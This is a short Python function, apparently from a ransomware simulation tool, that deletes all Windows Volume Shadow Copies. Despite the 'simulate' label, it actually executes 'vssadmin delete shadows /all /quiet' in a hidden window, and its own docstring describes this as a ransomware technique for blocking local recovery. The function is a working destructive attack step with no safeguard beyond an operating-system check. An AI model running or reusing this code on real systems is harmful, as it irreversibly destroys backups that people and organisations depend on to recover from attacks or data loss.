def simulate_shadow_copy_deletion():
"""
Simulates the deletion of Volume Shadow Copies on Windows.
This is a common ransomware technique to prevent easy local recovery.
Requires administrative privileges to run effectively.
"""
if platform.system() == "Windows":
print("\n [*] Attempting to delete Volume Shadow Copies (requires admin)...")
try:
# Use subprocess to run vssadmin command.
# /quiet suppresses confirmation prompts.
result = subprocess.run(
["vssadmin", "delete", "shadows", "/all", "/quiet"],
capture_output=True,
text=True,
check=True, # Raise an exception for non-zero exit codes
creationflags=subprocess.CREATE_NO_WINDOW # Hide the command window
)
print(f" [+] Shadow copies deletion command executed: {result.stdout.strip()}")
except subprocess.CalledProcessError as e:
print(f" [-] Failed to delete shadow copies: {e.stderr.strip()}")
print("     (This usually means the script wasn't run with administrator privileges)")
except FileNotFoundError:
print(" [-] 'vssadmin' command not found. Are you on Windows?")
except Exception as e:
print(f" [-] An unexpected error occurred during shadow copy deletion: {e}")
else:
print(" [*] Shadow copy deletion simulation skipped (Not a Windows system).")
